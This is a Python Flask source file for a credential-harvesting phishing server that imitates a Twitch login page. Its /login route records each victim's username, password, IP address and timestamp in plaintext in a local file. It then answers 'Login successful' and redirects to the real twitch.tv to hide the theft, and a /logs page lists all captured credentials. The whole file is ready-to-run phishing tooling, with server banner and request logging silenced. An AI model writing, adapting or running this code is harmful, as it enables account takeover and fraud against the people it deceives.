from flask import Flask, render_template, request, redirect, jsonify
import os
import datetime
import flask.cli
import logging

flask.cli.show_server_banner = lambda *a, **k: None
logging.getLogger('werkzeug').setLevel(logging.ERROR)

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

path = "Twitch"
os.makedirs(path, exist_ok=True)
LOG_FILE = "Twitch.txt"
full_path = os.path.join(path, LOG_FILE)

if not os.path.exists(full_path):
    with open(full_path, "a", encoding="utf-8") as f:
        f.write("🔥 Twitch Login 🔥\n")
        f.write("=" * 50 + "\n\n")


@app.route('/')
def login_page():
    return render_template('twitch.html')


@app.route('/login', methods=['POST'])
def handle_login():
    try:
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        remember = request.form.get('remember', 'off')

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip_address = request.remote_addr

        with open(full_path, 'a', encoding='utf-8') as f:
            f.write(
                f"Time: {timestamp} | IP: {ip_address} | Username: {username} | Password: {password} | Remember: {remember}\n")
            f.write("-" * 80 + "\n")

        print(f"✅ Save Information: {username} - {password} - IP: {ip_address}")

        return jsonify({
            'status': 'success',
            'message': 'Login successful',
            'redirect': 'https://www.twitch.tv'
        }), 200

    except Exception as e:
        print(f"❌ Error Saving information: {e}")
        return jsonify({
            'status': 'error',
            'message': 'Internal server error'
        }), 500


@app.route('/logs')
def view_logs():
    try:
        with open(full_path, 'r', encoding='utf-8') as f:
            logs = f.read()
        return f"<pre>{logs}</pre>"
    except Exception as e:
        return f"Error reading logs: {e}"


def run():
    print("🚀Twitch Server is running ...")
    print(f"📁 Save Credentials: {full_path}")
    print("🌐 Server Address : http://localhost:5001")
    print("📊 Logs: http://localhost:5001/logs")
    app.run(host="0.0.0.0", port=5001, debug=False, use_reloader=False)


if __name__ == '__main__':
    run()